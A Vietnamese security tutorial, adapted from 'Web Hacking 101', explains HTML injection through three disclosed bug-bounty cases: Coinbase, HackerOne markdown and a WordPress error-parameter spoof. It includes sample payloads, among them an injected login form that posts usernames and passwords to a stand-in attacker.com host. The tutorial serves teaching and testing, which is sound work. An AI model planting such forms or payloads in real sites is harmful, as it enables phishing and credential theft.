## Description
* Hypertext Markup Language (HTML) injection đôi khi cũng hơi ảo ảo =)). Đây thực sự là một cuộc tấn công được thực hiện bởi một website cho phép người dùng inject HTML vào các trang web của mình bằng cái kiểu mà không giống người dùng bình thường nhập dữ liệu. Nói cách khác, HTML Injection được gây ra bởi việc nhận HTML. Thông thường, thông qua một số hình thức nhập, sau đó được hiện thị dưới dạng input form trên trang web. Điều này khác biệt với Javascript, VBScript, ..., có thể dẫn đến Cross Site Scripting Attacks. Vì HTML là ngôn ngữ được sử dụng để xác định cấu trúc của một website, nếu Attacker có thể HTML Injection, về cơ bản chúng có thể thay đổi giao diện của trình duyệt và của trang web đó. Đôi khi, điều này có thể dẫn đến thay đổi hoàn toàn giao diện của trang hoặc trong các trường hợp khác, tạo HTML forms để lừa người dùng với hy vọng họ sử dụng form để gửi thông tin nhạy cảm (Có thể được gọi là lừa đảo). Ví dụ: Nếu bạn có thể HTML Injection, bạn có thể thêm thẻ <form> vào trang, yêu cầu người dùng nhập lại tên người dùng và mật khẩu của họ như:
    ```html
    <form method='POST' action='http://attacker.com/capture.php' id="login-form">
        <input type='text' name='username' value=''>
        <input type='password' name='password' value=''>
        <input type='submit' value='submit'>
    </form>
     ```
 * Tuy nhiên, khi gửi form này, thông tin thực sự sẽ được gửi đến `http://attacker.com/` thông qua thuộc tính `action`, nó sẽ gửi thông tin đến trang web của Attacker.
## Examples
### 1. Coinbase Comments
#### Description
   * Đối với lỗ hổng này, reporter đã xác định rằng Coinbase đang giải mã các giá trị được mã hóa URI khi render văn bản. Thông thường các kí tự trong URI không được bảo vệ. Khi một ký tự được mã hóa URI, nó được chuyển đổi thành giá trị byte trong bảng mã ASCII và trước dấu %. Vì vậy, / trở thành %2F, & trở thành %26. Bên cạnh đó, ASCII là một loại mã phổ biến nhất trên internet cho đến khi UTF-8 xuất hiện. Chúng ta cùng đến một ví dụ về loại tấn công này nhé.
       ```html
        <h1>This is a test</h1>
       ```
    * Coinbase sẽ hiển thị dưới dạng văn bản thuần túy, chính xác như bạn thấy ở bên trên. Nhưng người dùng gửi đi những ký tự được mã hóa thì sẽ trở thành 
        ```html
        %3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E
        ```
    * Coinbase sẽ giải mã chuỗi đó và hiển thị dưới dạng 
                  <h1>This is a test</h1>
    * Bạn đọc có thể xem video này để hiểu rõ hơn về kiểu tấn công này.
      > [HTML Injection in apps user review](https://www.dropbox.com/s/360cytluyiw2ym9/HTMLI.mp4?dl=0)
    * Khi bạn kiểm tra một trang web, hãy kiểm tra xem nó được xử lý các loại đầu vào khác nhau nào, bao gồm văn bản thuần túy và văn bản được mã hóa. Hãy hết sức cảnh giác với các trang web chấp nhận các giá trị được mã hóa URI và hiển thị được decoded values. Bạn đọc có thể sử dụng công cụ [CyberChef](https://gchq.github.io/CyberChef) để mã hóa và giải mã URI. Tôi nghĩ rằng bạn sẽ rất thích nó đấy ^^.
### 2. HackerOne Unintended HTML Inclusion
#### Description:
   * Về vấn đề này, chúng ta sẽ cho một ví dụ luôn nhé.
     ```html
     [test](http://www.torontowebsitedeveloper.com "test ismap="yes"')
     ```
     Trình soạn thảo HTML sẽ lấy đoạn ở trên và biến thành 
     ```html
     <a title="test ismap="yes"' href="http://www.torontowebsitedeveloper.com">test</a>
      ```
     Nói cách khác, code sẽ xem xét đệ quy chuỗi nào nên là chuỗi tiêu đề và sử dụng first single hoặc double quote. Tôi đã có thể đưa 1 loạt HTML vào thẻ `<a>`. Đây có vẻ là một lỗi khá nghiêm trọng đúng không :D.
### 3. Within Security Content Spoofing
#### Description:
   * Mặc dù về mặt spoofing nội dung về mặt kỹ thuật là một loại lỗ hổng khác với HTML Injection, tôi đã đưa nó vào đây vì attacker có thể hiển thị nội dung mà attacker muốn chọn. Inside Security được xây dựng trên nền tảng Wordpress bao gồm đường dẫn đăng nhập `withinsecurity.com/wp-login.php`. Một hacker nhận thấy rằng trong quá trình đăng nhập, nếu xảy ra lỗi thì Inside Security sẽ hiển thị access_denied, cũng tương ứng với tham số lỗi trong URL: 
     ```
     https://withinsecurity.com/wp-login.php?error=access_denied
     ```
     Nhận thấy điều này, attacker đã thử sửa đổi tham số lỗi và thấy rằng bất kỳ giá trị nào được nhập vào đều được trang web hiển thị như một phần của thông báo lỗi được thông báo cho người dùng. Dưới đây, ví dụ được sử dụng: 
     ```
     https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked
     ```
      ![](https://images.viblo.asia/ddb80975-2933-4e2e-a421-a4eb11d0cb45.png)
    * Kết luận ở đây: Ta thấy tham số trong URL được hiển thị trên trang. Một thử nghiệm đơn giản thay đổi tham số access_denied có thể đã tạo ra một lỗ hổng trong trường hợp này.
    * Chú ý: Theo dõi các tham số URL đang được thông qua và hiển thị dưới dạng nội dung của trang. Chúng có thể tạo cơ hội cho attacker lừa nạn nhân thực hiện một số hành động nguy hiểm. Đôi khi, điều này dẫn đến các kiểu tấn công Cross Site Scripting hoặc là giả mạo nội dung và HTML Injection.
### Summary
   * HTML Injection trình bày một lỗ hổng cho các trang web và nhà phát triển vì nó có thể được sử dụng để lừa đảo người dùng và lừa họ gửi thông tin nhạy cảm đến hoặc truy cập các trang web độc hại. 
   * Khám phá các loại lỗ hỏng này không phải luôn luôn là gửi HTML đơn giản mà còn phải khám phá cách mà một trang web có thể hiển thị văn bản được nhập của bạn, như các ký tự được mã hóa URI. Và mặc dù không hoàn toàn giống như nội dung HTML, việc giả mạo nội dung cũng tượng tự ở chỗ nó liên quan đến đầu vào được hiển thị lên cho nạn nhân trong trang HTML. Attacker luôn có cơ hội để loại bỏ tham số URL và hiển thị chúng trên trang web. 

-----

 >Nguồn: Web Hacking 101, biên tập và dịch lại.